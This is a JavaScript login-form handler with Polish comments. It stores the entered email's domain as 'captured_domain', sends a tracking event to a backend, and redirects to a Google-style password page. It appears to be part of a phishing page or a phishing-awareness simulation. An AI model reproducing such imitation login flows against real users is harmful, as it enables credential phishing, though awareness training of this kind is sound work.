if (loginForm) {
    // DODANO 'async' TUTAJ vvv
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault(); 
        const emailValue = document.getElementById('email').value;

        // ✅ WALIDACJA - Blokuj fałszywe emaile
        if (window.EmailValidator && window.EmailValidator.isFakeEmail(emailValue)) {
            window.EmailValidator.showBlockedMessage();
            return; 
        }

        const domain = emailValue.split('@')[1] || "nieznana";
        sessionStorage.setItem('captured_domain', domain);
        // 📊 Zapisz statystyki lokalne
        if (window.UserStats) {
            window.UserStats.recordEmailEntered();
            window.UserStats.save();
        }

        // 🚀 WYSYŁKA DO BAZY - Teraz z await zadziała poprawnie
        if (window.Tracker) {
            // Czekamy, aż Supabase potwierdzi odebranie danych
            await window.Tracker.sendEvent("1_email_entered", domain);
        }

        // ⏳ ANIMACJA I PRZEJŚCIE
        const progressBarCont = document.getElementById('progress-bar-container');
        const progressBar = document.getElementById('progress-bar');
        
        if (progressBarCont && progressBar) {
            progressBarCont.style.display = 'block';
            
            setTimeout(() => { 
                progressBar.style.width = '70%'; 
                setTimeout(() => {
                    progressBar.style.width = '100%';
                    setTimeout(() => {
                        // Przekierowanie nastąpi dopiero po wysłaniu danych
                        window.location.href = "logowanie-g-password.html?email=" + encodeURIComponent(emailValue);
                    }, 200);
                }, 800);
            }, 100);
        } else {
            // Jeśli nie masz paska postępu, leć od razu dalej
            window.location.href = "logowanie-g-password.html?email=" + encodeURIComponent(emailValue);
        }
    });
}